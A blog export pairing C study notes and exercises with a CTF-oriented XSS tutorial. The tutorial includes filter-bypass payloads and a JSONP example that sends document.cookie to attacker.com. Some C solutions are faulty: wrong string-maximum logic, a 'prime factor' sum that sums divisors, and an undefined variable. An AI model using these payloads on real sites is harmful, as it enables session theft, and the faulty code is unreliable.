<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i,a[10];</span><br><span class="line">int* p=a;\\p初值是a，p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++)scanf(&quot;%d&quot;,p++);</span><br><span class="line">p=a;\\重新使p指向a[0]</span><br><span class="line">for(i=0;i&lt;10;i++,p++)printf(&quot;%d&quot;,*p);</span><br></pre></td></tr></table></figure>

<p>若a[0]&#x3D;3，++(*p) &#x3D;&gt;a[0]&#x3D;4</p>
<p>fun(int arr[],int n)  &#x3D;  fun(int* arr,int n)</p>
<h4 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h4><p><code>*(a[i]+j)</code>或 <code>*(*(a+i)+j)</code>是<code>a[i][j]</code>的值</p>
<p>对于a是二维数组，则a[i]是一位数组名，他是一个地址，并不代表一个储存单元&#x2F;其中的值</p>
<p><img src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250119103815734.png"></p>
<p>int (*p)[4]定义包含4个元素的一维数组的指针变量</p>
<p>e.g 有一个二维数组<code>int arr[3][4]</code>，可用int (*p)[4]来声明一个指针p指向这个二维数组某一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int arr[3][4]=&#123;&#123;0,1,2,3&#125;,&#123;4,5,6,7&#125;,&#123;8,9,10,11&#125;&#125;;</span><br><span class="line">int (*p)[4]=&amp;arr[0];\\p指向arr某一行</span><br></pre></td></tr></table></figure>

<h3 id="通过指针引用字符串"><a href="#通过指针引用字符串" class="headerlink" title="通过指针引用字符串"></a>通过指针引用字符串</h3><p>通过字符数组名&#x2F;字符指针变量可以输出一个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char* a,str[10];</span><br><span class="line">a=str;</span><br><span class="line">scanf(&quot;%s&quot;,a);</span><br></pre></td></tr></table></figure>

<p>数组名虽代表地址，但它是常量，其值不可改变</p>
<p>字符指针变量指向的字符串常量中的内容是不可被取代</p>
<h3 id="指向函数的指针"><a href="#指向函数的指针" class="headerlink" title="指向函数的指针"></a>指向函数的指针</h3><p>函数名是一个指针（地址）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int (*p)(int,int)</span><br><span class="line">p=max;\\将函数入口地址赋给p</span><br><span class="line">c=(*p)(a,b);\\用*p代替函数名</span><br></pre></td></tr></table></figure>

<p>char* p[6]包含6个指针的数值</p>
<h2 id="用户自己建立数据类型"><a href="#用户自己建立数据类型" class="headerlink" title="用户自己建立数据类型"></a>用户自己建立数据类型</h2><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>struct 结构体名{</p>
<p>​	成员表列（类型名 成员名）;</p>
<p>};</p>
<p>引用结构体变量中成员的值：结构体变量名.成员名 e.gstudent1.num&#x3D;10010;</p>
<p>不能通过输出结构体变量名来达到输出结构体变量所有成员的值</p>
<p>若p指向一个结构体变量stu</p>
<p>则 stu.num &lt;&#x3D;&gt; (*p).num &lt;&#x3D;&gt; p-&gt;num</p>
<p>结构体数组读入不用加&amp;</p>
<h3 id="共用体"><a href="#共用体" class="headerlink" title="共用体"></a>共用体</h3><p>union 共用体名{</p>
<p>​	成员表列（类型名 成员名）;</p>
<p>};</p>
<h3 id="typedef声明新类型名"><a href="#typedef声明新类型名" class="headerlink" title="typedef声明新类型名"></a>typedef声明新类型名</h3><h1 id="C语言经典例题"><a href="#C语言经典例题" class="headerlink" title="C语言经典例题"></a>C语言经典例题</h1><h2 id="统计一个字符串中每个单词的字符数"><a href="#统计一个字符串中每个单词的字符数" class="headerlink" title="统计一个字符串中每个单词的字符数"></a>统计一个字符串中每个单词的字符数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char c;</span><br><span class="line">	int count=0;\\用于统计当前单词的字符数</span><br><span class="line">	int first=1;\\用于标记是否是第一个输出的字符数，初始值为1，表示是第一个</span><br><span class="line">	while(scanf(&quot;%c&quot;,&amp;c)&amp;&amp;c!=&#x27;.&#x27;)&#123;</span><br><span class="line">		if(c==&#x27; &#x27;)&#123;\\如果读取到的字符是空格，说明当前单词结束</span><br><span class="line">			if(count&gt;0)&#123;\\如果count大于0，说明前面有单词字符被统计</span><br><span class="line">				if(!first)printf(&quot; &quot;);\\如果first为0（即不是第一个输出），则先输出一个空格作为分隔</span><br><span class="line">				printf(&quot;%d&quot;,count);</span><br><span class="line">				first=0;</span><br><span class="line">				count=0;\\重置count为0，准备统计下一个单词</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else count++;\\如果读取到的字符不是空格，则count加1，继续统计当前单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">	if(count&gt;0)&#123;\\循环结束后，如果count大于0，说明最后一个单词的字符数还没有输出</span><br><span class="line">		if(!first)printf(&quot; &quot;);\\如果不是第一个输出，先输出一个空格</span><br><span class="line">		printf(&quot;%d&quot;,count);\\输出最后一个单词的字符数</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="统计3个字符串，并找出其中最大值"><a href="#统计3个字符串，并找出其中最大值" class="headerlink" title="统计3个字符串，并找出其中最大值"></a>统计3个字符串，并找出其中最大值</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char str [3] [20];</span><br><span class="line">	char string[20];</span><br><span class="line">	for(int i=0;i&lt;3;i++)&#123;</span><br><span class="line">		gets(str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">		if(strcmp(str[i],str[i+1])&gt;0)strcpy(string,str[i]);</span><br><span class="line">		if(strcmp(str[i],str[i+1])&lt;=0)strcpy(string,str[i+1]);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;%s&quot;,string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="字符串的复制（指针）"><a href="#字符串的复制（指针）" class="headerlink" title="字符串的复制（指针）"></a>字符串的复制（指针）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to=*from)!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		to++;</span><br><span class="line">		from++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while((*to++=*from++)!=&#x27;\0&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void copy_string(char* from,char* to)&#123;</span><br><span class="line">	while(*from!=&#x27;\0&#x27;)&#123;</span><br><span class="line">		*to++=*from++;</span><br><span class="line">		*to=&#x27;\0&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void selectSort(int arr[],int n)&#123;</span><br><span class="line">    int i,j,minIndex,temp;</span><br><span class="line">    for(i=0;i&lt;n-1;i++)&#123;  //外层循环控制排序趟数</span><br><span class="line">        minIndex=i;  //假设当前位置元素就是最小值</span><br><span class="line">        for (j=i+1;j&lt;n;j++)&#123;  //内层循环在剩余元素中找最小值</span><br><span class="line">            if(arr[j]&lt;arr[minIndex])minIndex=j;  //更新最小值索引</span><br><span class="line">        &#125;</span><br><span class="line">        if(minIndex!=i)&#123;  //如果找到更小的元素，进行交换</span><br><span class="line">            temp=arr[i];</span><br><span class="line">            arr[i]=arr[minIndex];</span><br><span class="line">            arr[minIndex]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="人数过半"><a href="#人数过半" class="headerlink" title="人数过半"></a>人数过半</h2><p>输入N个数，求出现次数超过总数一半的数。数据保证存在这个数。</p>
<p>输入格式:</p>
<p>第一行输入一个正整数N(N&lt;1000)；</p>
<p>第二行输入N个数，每个数的绝对值不超过1e9。</p>
<p>输出格式:</p>
<p>输出一个数，即出现次数超过总数一半的数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int n;</span><br><span class="line">    scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">    int a[2000];</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    int can=a[0];</span><br><span class="line">    int cnt=1;</span><br><span class="line">    for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">        if(cnt==0)&#123;</span><br><span class="line">            can=a[i];</span><br><span class="line">            cnt=1;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(can==a[i])cnt++;</span><br><span class="line">        else cnt--;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;%d&quot;,can);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="n个数字中选出数字和最大的连续一段"><a href="#n个数字中选出数字和最大的连续一段" class="headerlink" title="n个数字中选出数字和最大的连续一段"></a>n个数字中选出数字和最大的连续一段</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sum1=0,sum=-1000;</span><br><span class="line">   for(int i=0;i&lt;n;i++)&#123;</span><br><span class="line">       sum1=(sum1+a[i])&gt;a[i]?(sum1+a[i]):a[i];</span><br><span class="line">       if(sum1&gt;sum)sum=sum1;</span><br><span class="line">   &#125;</span><br><span class="line">   printf(&quot;%d&quot;,sum);</span><br></pre></td></tr></table></figure>

<h2 id="结尾不输出空行"><a href="#结尾不输出空行" class="headerlink" title="结尾不输出空行"></a>结尾不输出空行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int flag=1;</span><br><span class="line">···</span><br><span class="line">if(!flag)printf(&quot;\n&quot;);</span><br><span class="line">flag=0;</span><br><span class="line">···\\输出···</span><br></pre></td></tr></table></figure>

<h2 id="数组元素右移"><a href="#数组元素右移" class="headerlink" title="数组元素右移"></a>数组元素右移</h2><p>n个数，第i个数向右移m个整数变为a[(i+n-m)%n]</p>
<h2 id="单词翻转"><a href="#单词翻转" class="headerlink" title="单词翻转"></a>单词翻转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">char* r(char* s)&#123;</span><br><span class="line">	int len=strlen(s);</span><br><span class="line">	for(int i=0;i&lt;len/2;i++)&#123;</span><br><span class="line">		char t=s[i];</span><br><span class="line">		s[i]=s[len-1-i];</span><br><span class="line">		s[len-1-i]=t;</span><br><span class="line">	&#125;</span><br><span class="line">	return s;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">	char s[25];</span><br><span class="line">	while(scanf(&quot;%s&quot;,s)!=EOF)&#123; \\去除多余空格</span><br><span class="line">		printf(&quot;%s&quot;,r(s));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="10进制数n转化成m进制"><a href="#10进制数n转化成m进制" class="headerlink" title="10进制数n转化成m进制"></a>10进制数n转化成m进制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int cnt=1,sum=0;</span><br><span class="line">while(n&gt;0)&#123;</span><br><span class="line">	t=n%m;</span><br><span class="line">	t*=cnt;</span><br><span class="line">	sum+=t;</span><br><span class="line">	n/=m;</span><br><span class="line">	cnt*=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="求n的素数因子和"><a href="#求n的素数因子和" class="headerlink" title="求n的素数因子和"></a>求n的素数因子和</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(int i=1;i&lt;sqrt(n);i++)&#123;</span><br><span class="line">	if(n%i==0)&#123;</span><br><span class="line">		sum+=i;</span><br><span class="line">		if(n/i!=i)&#123;</span><br><span class="line">			sum+=n/i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="求a，b的最大公约数"><a href="#求a，b的最大公约数" class="headerlink" title="求a，b的最大公约数"></a>求a，b的最大公约数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m=a;</span><br><span class="line">n=b;</span><br><span class="line">while(n!=0)&#123;</span><br><span class="line">	t=m%n;</span><br><span class="line">	m=n;</span><br><span class="line">	n=t;</span><br><span class="line">&#125;\\m即为最大公约数</span><br></pre></td></tr></table></figure>

<h2 id="将一个n位数反转"><a href="#将一个n位数反转" class="headerlink" title="将一个n位数反转"></a>将一个n位数反转</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int number,res=0,rem;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;number);</span><br><span class="line">while(number!=0)&#123;</span><br><span class="line">	rem=num%10;</span><br><span class="line">	res=res*10+rem;</span><br><span class="line">	number/=10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int rows,conf=1;</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;rows);</span><br><span class="line">	for(int i=0;i&lt;rows;i++)&#123;</span><br><span class="line">		for(int space=1;space&lt;=rows-i-1;space++)&#123;</span><br><span class="line">			printf(&quot;  &quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		for(int j=0;j&lt;=i;j++)&#123;</span><br><span class="line">			if(j==0||i==0)conf=1;</span><br><span class="line">			else conf=conf*(i-j+1)/j;</span><br><span class="line">			printf(&quot;%4d &quot;,conf);</span><br><span class="line">		&#125;</span><br><span class="line">		printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>XSS漏洞</title>
    <url>/2025/02/05/XSS%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><p>XSS是基于<strong>前端</strong>的一种攻击，其实就是<strong>非Web应用自身的JS代码被黑客恶意插入</strong>，通过执行恶意的JS代码，可以导致<strong>窃取敏感信息、篡改网页内容或劫持用户会话</strong>，大部分情况是窃取Cookie，在你登录账号后的情况下，部分Web应用通过Cookie可以导致黑客能直接登录你的账号</p>
<h2 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h2><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>持久化，代码存储在后端（数据库、日志文件、评论等）中，容易造成蠕虫，盗窃cookie</p>
<p>数据流通：将恶意代码通过交互界面上传到后端，然后从而上传到数据库中（实现自动化攻击），当管理员admin查询数据库的信息时，恶意脚本又从后端到了前端</p>
<p><strong>在CTF中，利用GET、POST或者抓包在Referer，Cookie的地方植入我们的恶意脚本</strong></p>
<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>非持久化，需欺骗用户去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般出现在搜索页面，大多数用来盗取Cookie</p>
<p>数据流通：我们在一个输入框（一般是<code>&lt;input&gt;</code>标签形成）里输入我们的恶意脚本，需要用户进行触发才能进行攻击，在前端输入恶意脚本，后端接受，然后再在前端显示</p>
<p><strong>在CTF中，题目会给一个输入框，然后绕过过滤，执行恶意脚本</strong></p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>只发生在前端，利用 JavaScript 在浏览器端操作 DOM 时，动态插入和执行恶意代码，是通过url传入参数去控制触发的（也属于反射型XSS）</p>
<p>数据流通：在前端url添加我们的恶意脚本，然后直接在页面输出</p>
<h3 id="JSONP型XSS"><a href="#JSONP型XSS" class="headerlink" title="JSONP型XSS"></a>JSONP型XSS</h3><p>在浏览器的同源策略下，前端 JavaScript 不能直接跨域请求 <code>AJAX</code>（一种无需刷新页面就能向服务器发送和接收数据的技术），但可以利用 <code>&lt;script&gt;</code> 标签（允许跨域加载特性）进行跨域请求（允许从一个域名中获取到另一个域名的数据）</p>
<p>后端返回的是带回调函数的 JSON 数据，前端利用回调函数（<code>callback</code>）解析数据</p>
<p>攻击者可以<strong>伪造回调函数</strong>，利用 JSONP 执行任意 JavaScript 代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://example.com/user?callback=alert&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>如果服务器不做安全限制，返回的数据是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(&#123;&quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 25&#125;);</span><br></pre></td></tr></table></figure>

<p>这时 <code>alert()</code> 直接执行，可能导致 XSS 攻击，也可以窃取受害者的 Cookie：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;https://example.com/user?callback=evilFunction&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function evilFunction(data) &#123;</span><br><span class="line">    document.write(&quot;&lt;img src=&#x27;http://attacker.com/steal?cookie=&quot; + document.cookie + &quot;&#x27;&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XSS的攻击对象（XSS最终插入到哪里）"><a href="#XSS的攻击对象（XSS最终插入到哪里）" class="headerlink" title="XSS的攻击对象（XSS最终插入到哪里）"></a>XSS的攻击对象（XSS最终插入到哪里）</h2><h3 id="插入到HTML注释内容中"><a href="#插入到HTML注释内容中" class="headerlink" title="插入到HTML注释内容中"></a>插入到HTML注释内容中</h3><p>利用闭合的方式从而插入HTML注释内容之中</p>
<blockquote>
<p>[!CAUTION]</p>
<p>可能利用某些解析漏洞，导致代码执行</p>
<p>绕过 WAF（安全防火墙）检测，隐藏 XSS 代码（如果后端在某些情况下错误地解析了注释（比如动态拼接 HTML），注释中的 XSS 可能会被执行）</p>
<p>诱导用户手动执行 XSS（社工攻击）</p>
<p>前端错误解析 HTML 注释，导致 XSS 触发（如<code>innerHTML</code>没有正确处理注释，导致 <code>&lt;script&gt;</code> 被执行）</p>
<p>配合 DOM XSS，影响前端页面（如 <code>innerHTML</code> 解析了注释，导致 <code>&lt;img&gt;</code> 执行 <code>onerror</code> XSS）</p>
</blockquote>
<h3 id="插入到HTML标签的属性值中"><a href="#插入到HTML标签的属性值中" class="headerlink" title="插入到HTML标签的属性值中"></a>插入到HTML标签的属性值中</h3><p>通常配合<code>onerror</code>使用</p>
<blockquote>
<p>[!IMPORTANT]</p>
<h4 id="onerror（XSS利用点）"><a href="#onerror（XSS利用点）" class="headerlink" title="onerror（XSS利用点）"></a>onerror（XSS利用点）</h4><p>一个<strong>事件处理程序</strong>，当资源（如图片、脚本、iframe）加载失败时触发</p>
<h5 id="利用-标签"><a href="#利用-标签" class="headerlink" title="利用 &lt;img&gt; 标签"></a>利用 <code>&lt;img&gt;</code> 标签</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS!&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="利用-标签-1"><a href="#利用-标签-1" class="headerlink" title="利用 &lt;script&gt; 标签"></a>利用 <code>&lt;script&gt;</code> 标签</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;bad&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h5 id="利用-iframe"><a href="#利用-iframe" class="headerlink" title="利用 iframe"></a>利用 <code>iframe</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;invalid.html&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h5 id="onerror-结合-javascript-伪协议"><a href="#onerror-结合-javascript-伪协议" class="headerlink" title="onerror 结合 javascript: 伪协议"></a><code>onerror</code> 结合 <code>javascript:</code> 伪协议</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>


</blockquote>
<h3 id="插入到HTML标签的属性名中"><a href="#插入到HTML标签的属性名中" class="headerlink" title="插入到HTML标签的属性名中"></a>插入到HTML标签的属性名中</h3><p>如果服务器端没有正确转义 <code>name</code>，而是直接在 HTML 中插入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;欢迎, &lt;input type=&quot;text&quot; name=&quot;&#123;&#123; user_input &#125;&#125;&quot;&gt;!&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>浏览器解析后，HTML 变成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;欢迎, &lt;input type=&quot;text&quot; name=&quot;&quot;&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<h3 id="插入到HTML标签名中"><a href="#插入到HTML标签名中" class="headerlink" title="插入到HTML标签名中"></a>插入到HTML标签名中</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;content&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    let userInput = prompt(&quot;请输入标签名：&quot;);  </span><br><span class="line">    document.getElementById(&quot;content&quot;).innerHTML = `&lt;img $&#123;userInput&#125;&gt;`;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">src=x onerror=&quot;&lt;/img&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>解析后的HTML：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=&quot;&quot;&gt;</span><br><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>原因：<code>&lt;img&gt;</code>是自闭合标签，不会有 <code>&lt;/img&gt;</code> 这样的闭合标签，当解析器看到 <code>&quot;&lt;/img&gt;</code>，它会忽略这个 <code>&lt;/img&gt;</code> 并直接闭合 <code>&lt;img&gt;</code></p>
<h3 id="最简单的插入到script-img-svg标签中"><a href="#最简单的插入到script-img-svg标签中" class="headerlink" title="最简单的插入到script,img,svg标签中"></a>最简单的插入到script,img,svg标签中</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="插入到CSS中-旧版浏览器"><a href="#插入到CSS中-旧版浏览器" class="headerlink" title="插入到CSS中(旧版浏览器)"></a>插入到CSS中(旧版浏览器)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`xss`)&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>当用户打开这一个页面时，会执行弹窗，浏览器会执行我们插入的java伪协议代码，从而执行恶意代码</p>
<h3 id="插入到HTTP响应中"><a href="#插入到HTTP响应中" class="headerlink" title="插入到HTTP响应中"></a>插入到HTTP响应中</h3><p>这就要牵扯到CRLF漏洞</p>
<p>利用CRLF漏洞将http包分为了header和body，利用回车符&#x2F;换行符成功执行了body中的代码，实现XSS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?key=%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>返回包变成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date:xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">Content-type:text/html</span><br><span class="line"></span><br><span class="line">Contet-Length:xxx</span><br><span class="line"></span><br><span class="line">Connection:close</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line"></span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>

<p>如果遇到XSS过滤的情况我们还可以在httpheader中注入<code>X-XSS-Protection:0</code>（旧版服务器），可绕过浏览器的过滤规则实现XSS弹窗显示（主要为反射型XSS）</p>
<h2 id="XSS的绕过"><a href="#XSS的绕过" class="headerlink" title="XSS的绕过"></a>XSS的绕过</h2><h3 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sCriPt&gt;alert(1)&lt;sCriPt&gt;</span><br></pre></td></tr></table></figure>

<h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><p><code>eval</code>，<code>top</code>，<code>window</code>，<code>self</code>，<code>parent</code>，<code>frames</code>等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="函数替换绕过"><a href="#函数替换绕过" class="headerlink" title="函数替换绕过"></a>函数替换绕过</h4><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="document-write"><a href="#document-write" class="headerlink" title="document.write()"></a>document.write()</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="setTimeout-和-setInterval"><a href="#setTimeout-和-setInterval" class="headerlink" title="setTimeout()和 setInterval()"></a><code>setTimeout()</code>和 <code>setInterval()</code></h5><p>JavaScript 中用于延时执行代码的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="利用构造器"><a href="#利用构造器" class="headerlink" title="利用构造器"></a>利用构造器</h5><p>通过构造器动态生成并执行 JavaScript 代码</p>
<p><code>Set.constructor</code>，<code>Map.constructor</code>，<code>Array.constructor</code>，<code>WeakSet.constructor</code>，<code>constructor.constructor</code>等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="利用数组方法"><a href="#利用数组方法" class="headerlink" title="利用数组方法"></a>利用数组方法</h5><p><code>[1].map</code>，<code>[1].find</code>，<code>[1].every</code>，<code>[1].filter</code>，<code>[1].forEach</code>，<code>[1].findIndex</code>等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;</span><br></pre></td></tr></table></figure>

<h4 id="嵌套绕过"><a href="#嵌套绕过" class="headerlink" title="嵌套绕过"></a>嵌套绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;XSS&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</span><br></pre></td></tr></table></figure>

<p>使用 <code>sc&lt;script&gt;ript</code>，<code>&lt;script&gt;</code> 被分成两部分：<code>sc</code> 和 <code>ript</code>，这样 XSS 过滤器可能不会识别整个标签，从而不会阻止该代码的执行</p>
